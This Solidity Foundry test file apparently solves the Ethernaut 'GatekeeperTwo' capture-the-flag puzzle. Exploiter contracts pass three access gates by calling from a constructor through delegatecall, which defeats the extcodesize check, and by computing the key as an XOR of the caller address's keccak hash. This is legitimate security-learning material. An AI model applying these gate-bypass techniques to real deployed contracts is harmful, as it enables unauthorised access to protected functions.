// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

contract GatekeeperTwoTest is Test {
    Exploiter c;

    address attacker = makeAddr("attacker");

    function setUp() public {
        c = new Exploiter(address(new GatekeeperTwo()));
    }

    function test_gate() external {
        vm.prank(attacker);
        new Exploiter2(address(c));
    }
}

contract Exploiter2 {
    constructor(address _exploiter) {
        (bool success, bytes memory data) = _exploiter.delegatecall(
            abi.encodeWithSignature("enter()")
        );
    }
}

contract Exploiter {
    address immutable GATE;

    constructor(address _gate) {
        GATE = _gate;
    }

    function enter() external {
        bytes8 key = _getKey();
        bool success;
        IGatekeeper(GATE).enter(key);
    }

    function _getKey() internal returns(bytes8 key) {
        // uint160 _mask = uint160(address(1)) << 63; 
        // uint160 _last16 = uint160(uint16(uint160(msg.sender)));
        // key = bytes8(uint64(_mask + _last16));
        uint64 _hash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        key = bytes8(_hash ^ type(uint64).max);
    }
}

interface IGatekeeper {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        // ✅ by makign a contract call this contract
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        address who;
        assembly {
            // need to discover who will be the caller
            x := extcodesize(caller())
            who := caller()
        }
        console2.log("caller: ", who);
        console2.log("x: ", x);
        require(x == 0);
        console2.log("Passou");
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // need to discover the result
        console2.log("First: ", uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))));
        console2.log("Second: ", uint64(_gateKey) == type(uint64).max);
        console2.log("Result: ", uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);

        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        console2.log("Passou");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
